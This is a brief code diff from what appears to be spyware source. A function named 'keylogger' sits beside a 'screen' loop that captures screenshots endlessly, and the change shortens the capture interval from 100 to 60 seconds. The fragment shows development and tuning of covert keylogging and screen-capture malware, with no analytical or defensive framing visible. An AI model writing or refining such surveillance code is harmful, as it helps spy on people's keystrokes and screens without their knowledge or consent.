@@ -11,7 +11,7 @@ def keylogger():
 
 def screen():
     while True:
-        time.sleep(100)
+        time.sleep(60)
         PrintScreen.take_screen()
 
 
